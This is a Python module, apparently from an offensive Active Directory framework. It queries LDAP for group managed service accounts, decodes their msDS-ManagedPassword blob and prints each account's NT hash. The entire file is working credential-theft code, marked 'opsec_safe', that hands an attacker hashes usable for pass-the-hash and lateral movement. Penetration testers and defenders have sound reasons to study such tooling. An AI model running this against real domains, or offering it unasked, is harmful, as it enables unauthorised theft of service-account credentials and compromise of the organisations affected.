from rich.console import Console
from Cryptodome.Hash import MD4
from binascii import hexlify
from handlers.ldap_connection import LdapHandler
from helpers.gmsa_blob import MSDS_MANAGEDPASSWORD_BLOB

console = Console()


class Gmsa:
    name = "gmsa"
    desc = "Get GMSA account passwords"
    module_protocol = ["ldap"]
    opsec_safe = True
    multiple_hosts = False
    user_target = None
    search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
    requires_args = False
    attributes = ['sAMAccountName', 'msDS-ManagedPassword', 'msDS-GroupMSAMembership']

    def on_login(self):
        conn, base_dn = LdapHandler.connection(self)
        results = conn.search(base_dn, self.search_filter, attributes=self.attributes)
        res_status = results[0]
        res_response = results[2][0]

        console.print("[yellow][!][/] Searching for GMSA accounts and passwords")

        if res_status:
            if res_response['type'] == 'searchResEntry':
                sam_account_name = res_response['attributes']['sAMAccountName']
                managed_password = res_response['attributes']['msDS-ManagedPassword']

                if len(managed_password) <= 0:
                    console.print("[red][!][/] No GMSA accounts or your user don't have enough privileges")
                    return

                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(managed_password)
                hash = MD4.new()
                hash.update (blob['CurrentPassword'][:-2])
                hashed_pass = hexlify(hash.digest()).decode("utf-8")

                console.print(f" [cyan]-[/] [yellow]sAMAccountName[/]: {sam_account_name}", highlight=False)
                console.print(f" [cyan]-[/] [yellow]msDS-ManagedPassword[/]: {hashed_pass}\n", highlight=False)
        else:
            console.print("[red][!][/] No entries found in the results.")
